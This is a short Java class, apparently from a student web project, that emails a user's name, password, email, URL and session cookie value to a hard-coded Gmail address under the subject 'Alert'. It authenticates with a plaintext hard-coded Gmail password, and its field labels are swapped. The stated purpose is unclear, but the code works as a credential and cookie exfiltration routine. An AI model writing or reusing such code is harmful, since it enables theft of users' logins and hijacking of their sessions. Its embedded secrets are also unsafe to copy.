 /*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
import java.util.Properties;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.servlet.http.Cookie;

/**
 *
 * @author ANAGAN
 */
public class sendmaill {
    public void sendgroup(String maill,String url,String pwd, String msg,String cook)
     {
     String to="vijayakaran.s1997@gmail.com";//change accordingly  
      
      //Get the session object  
      Properties props = new Properties();  
      props.put("mail.smtp.host", "smtp.gmail.com");  
      props.put("mail.smtp.socketFactory.port", "465");  
      props.put("mail.smtp.socketFactory.class","javax.net.ssl.SSLSocketFactory");  
      props.put("mail.smtp.auth", "true");  
      props.put("mail.smtp.port", "465");    
      Session session = Session.getDefaultInstance(props,  
       new javax.mail.Authenticator() {  
       protected PasswordAuthentication getPasswordAuthentication() {  
       return new PasswordAuthentication("demoproject143@gmail.com","haihello");//change accordingly  
       }  
      });  
      //compose message  
      try {  
       MimeMessage message = new MimeMessage(session);  
       message.setFrom(new InternetAddress("demoproject143@gmail.com"));//change accordingly  
       message.addRecipient(Message.RecipientType.TO,new InternetAddress(to));  
       message.setSubject("Alert");  
       message.setText("user name = "+pwd+ " "+ "Password = " +msg +" "+ "Url"+" "+url +" "+ "E-mail"+" "+maill +" "+ "Cookie Value"+" "+cook);    
       
       //send message  
       Transport.send(message);  
       System.out.println("message sent successfully");   
      } catch (MessagingException e) {
          throw new RuntimeException(e);
          
          
      }  
}
}